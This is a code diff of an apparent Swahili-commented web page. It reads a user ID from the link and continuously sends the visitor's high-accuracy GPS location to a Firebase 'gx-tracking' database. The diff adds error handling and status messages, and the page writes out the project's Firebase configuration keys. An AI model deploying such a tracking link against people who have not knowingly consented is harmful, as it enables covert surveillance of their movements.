@@ -8,15 +8,16 @@
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
 
 <script>
+// Firebase Configuration (Imeachwa kama ilivyo)
 const firebaseConfig = {
-  apiKey: "AIzaSyCc5yrARvCo5w6ZVKuEaE4YuILcC4rJ0Sk",
-  authDomain: "gx-tracking.firebaseapp.com",
-  databaseURL: "https://gx-tracking-default-rtdb.firebaseio.com",
-  projectId: "gx-tracking",
-  storageBucket: "gx-tracking.firebasestorage.app",
-  messagingSenderId: "194870704198",
-  appId: "1:194870704198:web:131779ab69c562a5213247",
-  measurementId: "G-0PLG7WG6NX"
+  apiKey: "AIzaSyCc5yrARvCo5w6ZVKuEaE4YuILcC4rJ0Sk",
+  authDomain: "gx-tracking.firebaseapp.com",
+  databaseURL: "https://gx-tracking-default-rtdb.firebaseio.com",
+  projectId: "gx-tracking",
+  storageBucket: "gx-tracking.firebasestorage.app",
+  messagingSenderId: "194870704198",
+  appId: "1:194870704198:web:131779ab69c562a5213247",
+  measurementId: "G-0PLG7WG6NX"
 };
 
 firebase.initializeApp(firebaseConfig);
@@ -26,22 +27,52 @@ const db = firebase.database();
 </head>
 <body>
 
-<h2>Loading...</h2>
+<h2 id="statusMessage">Inapakia... Subiri ruhusa ya eneo...</h2>
 
 <script>
 const urlParams = new URLSearchParams(window.location.search);
 let uid = urlParams.get("uid");
+const statusElement = document.getElementById("statusMessage");
 
 function sendLocation(){
-  if(navigator.geolocation){
-    navigator.geolocation.watchPosition(pos => {
-      db.ref("users/" + uid).set({
-        lat: pos.coords.latitude,
-        lng: pos.coords.longitude,
-        time: Date.now()
-      });
-    });
-  }
+    if(navigator.geolocation){
+        // watchPosition inapewa kazi tatu: Mafanikio, Kosa, na Mipangilio
+        navigator.geolocation.watchPosition(
+            // 1. Kazi ya Mafanikio (Success Callback)
+            pos => {
+                // Sasisha ujumbe wa hali kuwa umefaulu
+                statusElement.innerHTML = `✅ **IMEFAULU KUFUNGUA UFUATILIAJI** kwa User ID: **${uid}**`;
+                statusElement.style.color = "green";
+
+                // Tuma data kwenye Firebase
+                db.ref("users/" + uid).set({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    time: Date.now()
+                });
+            },
+            // 2. Kazi ya Kosa (Error Callback) - Hii inarekebisha tatizo la kunyamaza
+            err => {
+                let errorMessage = "";
+                if (err.code === 1) {
+                    errorMessage = "Ruhusa ya eneo imekataliwa. Tafadhali ruhusu eneo.";
+                } else if (err.code === 3) {
+                    errorMessage = "Imeshindwa kupata eneo (Timeout).";
+                } else {
+                    errorMessage = "Kosa la Geolocation: " + err.message;
+                }
+                
+                statusElement.innerHTML = `❌ **KOSA LILITOKEA:** ${errorMessage}`;
+                statusElement.style.color = "red";
+                console.error("Geolocation Error:", err);
+            },
+            // 3. Mipangilio (Options)
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } 
+        );
+    } else {
+        statusElement.innerHTML = "❌ **Kivinjari chako hakiauni Geolocation.**";
+        statusElement.style.color = "red";
+    }
 }
 
 sendLocation();
